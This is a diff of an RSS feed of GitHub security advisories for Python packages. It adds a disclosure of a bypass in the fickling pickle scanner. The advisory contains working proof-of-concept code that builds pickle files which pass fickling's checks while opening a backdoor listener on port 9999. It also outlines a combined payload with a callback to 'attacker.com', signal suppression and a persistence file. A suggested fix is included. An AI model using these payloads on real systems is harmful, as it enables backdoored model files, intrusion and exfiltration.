@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-02-24T21:07:26.586Z</updated>
+    <updated>2026-02-24T22:05:48.124Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,219 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[fickling] Fickling: OBJ opcode call invisibility bypasses all safety checks]]></title>
+        <id>https://github.com/advisories/GHSA-mxhj-88fx-4pcv</id>
+        <link href="https://github.com/advisories/GHSA-mxhj-88fx-4pcv"/>
+        <updated>2026-02-24T21:41:34.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="assessment">Assessment</h1>
+<p>The interpreter so it behaves closer to CPython when dealing with <code>OBJ</code>, <code>NEWOBJ</code>, and <code>NEWOBJ_EX</code> opcodes (<a href="https://github.com/trailofbits/fickling/commit/ff423dade2bb1f72b2b48586c022fac40cbd9a4a">https://github.com/trailofbits/fickling/commit/ff423dade2bb1f72b2b48586c022fac40cbd9a4a</a>).</p>
+<h1 id="original-report">Original report</h1>
+<h2 id="summary">Summary</h2>
+<p>All 5 of fickling's safety interfaces -- <code>is_likely_safe()</code>, <code>check_safety()</code>, CLI <code>--check-safety</code>, <code>always_check_safety()</code>, and the <code>check_safety()</code> context manager -- report <code>LIKELY_SAFE</code> / raise no exceptions for pickle files that use the OBJ opcode to call dangerous stdlib functions (signal handlers, network servers, network connections, file operations). The OBJ opcode's implementation in fickling pushes function calls directly onto the interpreter stack without persisting them to the AST via <code>new_variable()</code>. When the result is discarded with POP, the call vanishes from the final AST entirely, making it invisible to all 9 analysis passes.</p>
+<p>This is a separate vulnerability from the REDUCE+BUILD bypass, with a different root cause. It survives all three proposed fixes for the REDUCE+BUILD vulnerability.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability is a single missing <code>new_variable()</code> call in <code>Obj.run()</code> (<code>fickle.py:1333-1350</code>).</p>
+<p><strong>REDUCE</strong> (<code>fickle.py:1286-1301</code>) correctly persists calls to the AST:</p>
+<pre><code class="language-python"># Line 1300: call IS saved to module_body
+var_name = interpreter.new_variable(call)
+interpreter.stack.append(ast.Name(var_name, ast.Load()))
+</code></pre>
+<p>The comment on lines 1296-1299 explicitly states: "if we just save it to the stack, then it might not make it to the final AST unless the stack value is actually used."</p>
+<p><strong>OBJ</strong> (<code>fickle.py:1333-1350</code>) does exactly what that comment warns against:</p>
+<pre><code class="language-python"># Line 1348: call is ONLY on the stack, NOT in module_body
+interpreter.stack.append(ast.Call(kls, args, []))
+</code></pre>
+<p>When the OBJ result is discarded by POP, the <code>ast.Call</code> is gone. The decompiled AST shows the import but no function call:</p>
+<pre><code class="language-python">from smtplib import SMTP    # import present (from STACK_GLOBAL)
+result = None              # no call to SMTP visible
+</code></pre>
+<p>Yet at runtime, <code>SMTP('127.0.0.1')</code> executes and opens a TCP connection.</p>
+<p><strong>NEWOBJ</strong> (<code>fickle.py:1411-1420</code>) and <strong>NEWOBJ_EX</strong> (<code>fickle.py:1423-1433</code>) have the same code pattern but are less exploitable since CPython's NEWOBJ calls <code>cls.__new__()</code> (allocation only) while OBJ calls <code>cls(*args)</code> (full constructor execution with <code>__init__</code> side effects).</p>
+<h3 id="affected-versions">Affected versions</h3>
+<p>All versions through 0.1.7 (latest as of 2026-02-19).</p>
+<h3 id="affected-apis">Affected APIs</h3>
+<ul>
+<li><code>fickling.is_likely_safe()</code> - returns <code>True</code> for bypass payloads</li>
+<li><code>fickling.analysis.check_safety()</code> - returns <code>AnalysisResults</code> with <code>severity = Severity.LIKELY_SAFE</code></li>
+<li><code>fickling --check-safety</code> CLI - exits with code 0</li>
+<li><code>fickling.always_check_safety()</code> + <code>pickle.load()</code> - no <code>UnsafeFileError</code> raised, malicious code executes</li>
+<li><code>fickling.check_safety()</code> context manager + <code>pickle.load()</code> - no <code>UnsafeFileError</code> raised, malicious code executes</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>A pickle that opens a TCP connection to an attacker's server via OBJ+POP, yet fickling reports it as <code>LIKELY_SAFE</code>:</p>
+<pre><code class="language-python">import io, struct
+
+def sbu(s):
+    """SHORT_BINUNICODE opcode helper."""
+    b = s.encode()
+    return b"\x8c" + struct.pack("&lt;B", len(b)) + b
+
+def make_obj_pop_bypass():
+    """
+    Pickle that calls smtplib.SMTP('127.0.0.1') at runtime,
+    but the call is invisible to fickling.
+
+    Opcode sequence:
+        MARK
+          STACK_GLOBAL 'smtplib' 'SMTP'   (import persisted to AST)
+          SHORT_BINUNICODE '127.0.0.1'    (argument)
+        OBJ                               (call SMTP('127.0.0.1'), push result)
+                                          (ast.Call on stack only, NOT in AST)
+        POP                               (discard result -&gt; call GONE)
+        NONE
+        STOP
+    """
+    buf = io.BytesIO()
+    buf.write(b"\x80\x04\x95")  # PROTO 4 + FRAME
+
+    payload = io.BytesIO()
+    payload.write(b"(")                              # MARK
+    payload.write(sbu("smtplib") + sbu("SMTP"))      # push module + func strings
+    payload.write(b"\x93")                            # STACK_GLOBAL
+    payload.write(sbu("127.0.0.1"))                   # push argument
+    payload.write(b"o")                               # OBJ: call SMTP('127.0.0.1')
+    payload.write(b"0")                               # POP: discard result
+    payload.write(b"N.")                              # NONE + STOP
+
+    frame_data = payload.getvalue()
+    buf.write(struct.pack("&lt;Q", len(frame_data)))
+    buf.write(frame_data)
+    return buf.getvalue()
+
+import fickling, tempfile, os
+data = make_obj_pop_bypass()
+path = os.path.join(tempfile.mkdtemp(), "bypass.pkl")
+with open(path, "wb") as f:
+    f.write(data)
+
+print(fickling.is_likely_safe(path))
+# Output: True  &lt;-- BYPASSED (network connection invisible to fickling)
+</code></pre>
+<p>fickling decompiles this to:</p>
+<pre><code class="language-python">from smtplib import SMTP
+result = None
+</code></pre>
+<p>Yet at runtime, <code>SMTP('127.0.0.1')</code> executes and opens a TCP connection.</p>
+<p><strong>CLI verification:</strong></p>
+<pre><code class="language-bash">$ fickling --check-safety bypass.pkl; echo "EXIT: $?"
+EXIT: 0    # BYPASSED
+</code></pre>
+<p><strong>Comparison with REDUCE (same function, detected):</strong></p>
+<pre><code class="language-bash">$ fickling --check-safety reduce_smtp.pkl; echo "EXIT: $?"
+Warning: Fickling detected that the pickle file may be unsafe.
+EXIT: 1    # DETECTED
+</code></pre>
+<h3 id="backdoor-listener-poc-most-impactful">Backdoor listener PoC (most impactful)</h3>
+<p>A pickle that opens a TCP listener on port 9999, binding to all interfaces:</p>
+<pre><code class="language-python">import io, struct
+
+def sbu(s):
+    b = s.encode()
+    return b"\x8c" + struct.pack("&lt;B", len(b)) + b
+
+def binint(n):
+    return b"J" + struct.pack("&lt;i", n)
+
+def make_backdoor():
+    buf = io.BytesIO()
+    buf.write(b"\x80\x04\x95")  # PROTO 4 + FRAME
+
+    payload = io.BytesIO()
+    # OBJ+POP: TCPServer(('0.0.0.0', 9999), BaseRequestHandler)
+    payload.write(b"(")                                          # MARK
+    payload.write(sbu("socketserver") + sbu("TCPServer") + b"\x93")  # STACK_GLOBAL
+    payload.write(b"(")                                          # MARK (inner tuple)
+    payload.write(sbu("0.0.0.0"))                                # host
+    payload.write(binint(9999))                                  # port
+    payload.write(b"t")                                          # TUPLE
+    payload.write(sbu("socketserver") + sbu("BaseRequestHandler") + b"\x93")  # handler
+    payload.write(b"o")                                          # OBJ
+    payload.write(b"0")                                          # POP
+    payload.write(b"N.")                                         # NONE + STOP
+
+    frame_data = payload.getvalue()
+    buf.write(struct.pack("&lt;Q", len(frame_data)))
+    buf.write(frame_data)
+    return buf.getvalue()
+
+import fickling
+data = make_backdoor()
+with open("/tmp/backdoor.pkl", "wb") as f:
+    f.write(data)
+
+print(fickling.is_likely_safe("/tmp/backdoor.pkl"))
+# Output: True  &lt;-- BYPASSED
+
+import pickle, socket
+server = pickle.loads(data)
+# Port 9999 is now LISTENING on all interfaces
+
+s = socket.socket()
+s.connect(("127.0.0.1", 9999))
+print("Connected to backdoor port!")  # succeeds
+s.close()
+server.server_close()
+</code></pre>
+<h3 id="multi-stage-combined-poc">Multi-stage combined PoC</h3>
+<p>A single pickle combining signal suppression + backdoor listener + outbound callback + file persistence:</p>
+<pre><code class="language-python"># All four operations in one pickle, all invisible to fickling:
+# 1. signal.signal(SIGTERM, SIG_IGN) - suppress graceful shutdown
+# 2. socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler) - backdoor
+# 3. smtplib.SMTP('attacker.com') - C2 callback
+# 4. sqlite3.connect('/tmp/.marker') - persistence marker
+
+# fickling reports: LIKELY_SAFE
+# All 4 operations execute at runtime
+</code></pre>
+<p><strong><code>always_check_safety()</code> verification:</strong></p>
+<pre><code class="language-python">import fickling, pickle
+
+fickling.always_check_safety()
+with open("poc_obj_multi.pkl", "rb") as f:
+    result = pickle.load(f)
+# No UnsafeFileError raised -- all 4 malicious operations executed
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker can distribute a malicious pickle file (e.g., a backdoored ML model) that passes all fickling safety checks. Demonstrated impacts:</p>
+<ul>
+<li><strong>Backdoor network listener</strong>: <code>socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler)</code> opens a port on all interfaces. The TCPServer constructor calls <code>server_bind()</code> and <code>server_activate()</code>, so the port is open immediately after <code>pickle.loads()</code> returns.</li>
+<li><strong>Process persistence</strong>: <code>signal.signal(SIGTERM, SIG_IGN)</code> makes the process ignore SIGTERM. In Kubernetes/Docker/ECS, the backdoor stays alive for 30+ seconds per restart attempt.</li>
+<li><strong>Outbound exfiltration</strong>: <code>smtplib.SMTP('attacker.com')</code> opens an outbound TCP connection. The attacker's server learns the victim's IP and hostname.</li>
+<li><strong>File creation on disk</strong>: <code>sqlite3.connect(path)</code> creates a file at an attacker-chosen path.</li>
+</ul>
+<p>A single pickle combines all operations. In cloud ML environments, this enables persistent backdoor access while resisting graceful shutdown. This affects any application using fickling as a safety gate for ML model files.</p>
+<p>The bypass works for any stdlib module NOT in fickling's <code>UNSAFE_IMPORTS</code> blocklist. Blocked modules (os, subprocess, socket, builtins, etc.) are still detected at the import level.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Add <code>new_variable()</code> to <code>Obj.run()</code> (lines 1348 and 1350), applying the same pattern used by <code>Reduce.run()</code> (line 1300):</p>
+<pre><code class="language-python"># fickle.py, Obj.run():
+-       if args or hasattr(kls, "__getinitargs__") or not isinstance(kls, type):
+-           interpreter.stack.append(ast.Call(kls, args, []))
+-       else:
+-           interpreter.stack.append(ast.Call(kls, kls, []))
++       if args or hasattr(kls, "__getinitargs__") or not isinstance(kls, type):
++           call = ast.Call(kls, args, [])
++       else:
++           call = ast.Call(kls, kls, [])
++       var_name = interpreter.new_variable(call)
++       interpreter.stack.append(ast.Name(var_name, ast.Load()))
+</code></pre>
+<p>Also apply to <code>NewObj.run()</code> (line 1414) and <code>NewObjEx.run()</code> (line 1426) for defense in depth.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/trailofbits/fickling/security/advisories/GHSA-mxhj-88fx-4pcv">https://github.com/trailofbits/fickling/security/advisories/GHSA-mxhj-88fx-4pcv</a></li>
+<li><a href="https://github.com/trailofbits/fickling/commit/ff423dade2bb1f72b2b48586c022fac40cbd9a4a">https://github.com/trailofbits/fickling/commit/ff423dade2bb1f72b2b48586c022fac40cbd9a4a</a></li>
+<li><a href="https://github.com/advisories/GHSA-mxhj-88fx-4pcv">https://github.com/advisories/GHSA-mxhj-88fx-4pcv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mxhj-88fx-4pcv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-24T21:41:31.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[mindsdb] MindsDB: Path Traversal in /api/files Leading to Remote Code Execution]]></title>
         <id>https://github.com/advisories/GHSA-4894-xqv6-vrfq</id>
@@ -1574,30 +1787,6 @@ Terminal 2 — Run attacker:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-02-19T20:29:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[Nova] OpenStack Nova calls qemu-img without format restrictions for resize ]]></title>
-        <id>https://github.com/advisories/GHSA-m4f3-qp2w-gwh6</id>
-        <link href="https://github.com/advisories/GHSA-m4f3-qp2w-gwh6"/>
-        <updated>2026-02-21T06:30:15.000Z</updated>
-        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Nova before 30.2.2, 31 before 31.2.1, and 32 before 32.1.1. By writing a malicious QCOW header to a root or ephemeral disk and then triggering a resize, a user may convince Nova's Flat image backend to call qemu-img without a format restriction, resulting in an unsafe image resize operation that could destroy data on the host system. Only compute nodes using the Flat image backend (usually configured with use_cow_images=False) are affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24708">https://nvd.nist.gov/vuln/detail/CVE-2026-24708</a></li>
-<li><a href="https://bugs.launchpad.net/nova/+bug/2137507">https://bugs.launchpad.net/nova/+bug/2137507</a></li>
-<li><a href="https://www.openwall.com/lists/oss-security/2026/02/17/7">https://www.openwall.com/lists/oss-security/2026/02/17/7</a></li>
-<li><a href="https://github.com/openstack/nova/commit/3eba22ff09c81a61750fbb4882e5f1f01a20fdf5">https://github.com/openstack/nova/commit/3eba22ff09c81a61750fbb4882e5f1f01a20fdf5</a></li>
-<li><a href="https://lists.debian.org/debian-lts-announce/2026/02/msg00025.html">https://lists.debian.org/debian-lts-announce/2026/02/msg00025.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-m4f3-qp2w-gwh6">https://github.com/advisories/GHSA-m4f3-qp2w-gwh6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m4f3-qp2w-gwh6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-18T18:30:40.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[Nova] OpenStack Nova calls qemu-img without format restrictions for resize ]]></title>
